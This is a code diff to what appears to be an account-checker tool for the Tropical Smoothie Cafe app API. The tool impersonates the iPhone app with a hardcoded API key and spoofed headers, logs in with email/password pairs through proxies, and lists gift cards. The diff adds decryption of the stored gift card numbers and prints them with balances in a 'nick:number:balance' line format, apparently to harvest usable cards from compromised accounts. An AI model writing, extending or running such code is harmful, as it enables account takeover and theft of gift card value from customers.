@@ -8,7 +8,7 @@ from typing import Any
 
 import requests
 
-from .crypto import aes_encrypt
+from .crypto import aes_decrypt, aes_encrypt
 
 API_BASE = "https://global.tropicalsmoothiecafeapi.com"
 API_KEY = "8bklk8bl1k3sB38D9B3l0enyTSC8c09B30lkq0cafe"
@@ -16,8 +16,20 @@ USER_AGENT = "Tropical Smoothie Cafe/6.8.20/3268 (iPhone; iOS 26.6.2; Scale/3.00
 DEVICE_TOKEN = "0" * 64
 
 
+def decrypt_gift_card(card: dict[str, Any]) -> dict[str, Any]:
+    """Decrypt cardNumber blob and attach as card_number_decrypted."""
+    out = dict(card)
+    encrypted = card.get("cardNumber") or card.get("card_number")
+    if encrypted and not out.get("card_number_decrypted"):
+        decrypted = aes_decrypt(str(encrypted))
+        if decrypted:
+            out["card_number_decrypted"] = decrypted
+    return out
+
+
 def format_gift_card(card: dict[str, Any]) -> str:
     nick = str(card.get("nickName") or card.get("nickname") or "card")
+    number = card.get("card_number_decrypted")
     balance = None
     for key in ("balance", "amount", "available_balance", "card_balance"):
         val = card.get(key)
@@ -25,6 +37,10 @@ def format_gift_card(card: dict[str, Any]) -> str:
             balance = f"${val}"
             break
     suffix = " (default)" if card.get("isDefault") else ""
+    if number and balance:
+        return f"{nick}:{number}:{balance}{suffix}"
+    if number:
+        return f"{nick}:{number}{suffix}"
     if balance:
         return f"{nick}:{balance}{suffix}"
     return f"{nick}{suffix}"
@@ -221,7 +237,9 @@ def check_account(email: str, password: str, proxy: str | None = None) -> Accoun
     try:
         gift_resp = client._request("GET", "/v1/payment/giftcards", auth=auth)
         if gift_resp.get("status") == "Success":
-            result.gift_cards = gift_resp.get("data") or []
+            result.gift_cards = [
+                decrypt_gift_card(card) for card in (gift_resp.get("data") or [])
+            ]
     except requests.RequestException:
         pass
 
